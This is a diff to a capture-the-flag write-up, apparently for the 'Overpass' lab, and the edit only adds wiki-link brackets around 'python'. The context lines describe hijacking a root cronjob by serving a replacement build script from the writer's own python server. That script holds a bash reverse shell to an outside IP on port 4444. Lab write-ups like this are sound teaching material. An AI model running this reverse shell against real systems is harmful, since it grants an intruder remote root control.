@@ -122,7 +122,7 @@ Linpeas flags up a cronjob running as root every minute. Downloading the content
 
 localhost... Lets change that to our IP address.
 
-We can then set up a python server containing `downloads/src/buildscript.sh` with our own version of `buildscript.sh`.
+We can then set up a [[python]] server containing `downloads/src/buildscript.sh` with our own version of `buildscript.sh`.
 
 `builtscript.sh` contents (reverse shell):
 
@@ -130,7 +130,7 @@ We can then set up a python server containing `downloads/src/buildscript.sh` wit
 bash -i >& /dev/tcp/10.11.47.218/4444 0>&1
 ```
 
-Here we set up the python server, using port 80 as cron will request the default port.
+Here we set up the [[python]] server, using port 80 as cron will request the default port.
 
 ![[overpass-python_server.png]]
 
